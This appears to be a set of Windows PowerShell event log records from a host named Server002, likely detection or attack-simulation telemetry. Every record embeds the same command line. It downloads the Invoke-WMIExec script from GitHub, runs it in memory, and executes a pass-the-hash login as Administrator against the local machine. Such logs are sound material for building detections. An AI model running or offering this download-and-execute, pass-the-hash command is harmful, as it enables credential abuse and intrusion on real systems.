{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 19:02:39.3449579"},"EventRecordID":"1043","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4a91b50e-b712-41f1-84e4-556cbe549567\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 19:02:39.3606573"},"EventRecordID":"1044","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4a91b50e-b712-41f1-84e4-556cbe549567\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 19:02:39.3606573"},"EventRecordID":"1045","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4a91b50e-b712-41f1-84e4-556cbe549567\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 19:02:39.3730719"},"EventRecordID":"1046","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4a91b50e-b712-41f1-84e4-556cbe549567\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 19:02:39.3730719"},"EventRecordID":"1047","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4a91b50e-b712-41f1-84e4-556cbe549567\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 19:02:39.3876857"},"EventRecordID":"1048","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4a91b50e-b712-41f1-84e4-556cbe549567\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 19:02:39.6751400"},"EventRecordID":"1049","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4a91b50e-b712-41f1-84e4-556cbe549567\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=c9d438b3-bf23-4164-99c2-6a6b363d80f8\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 19:02:41.5312380"},"EventRecordID":"1050","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=16\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4a91b50e-b712-41f1-84e4-556cbe549567\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=c9d438b3-bf23-4164-99c2-6a6b363d80f8\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
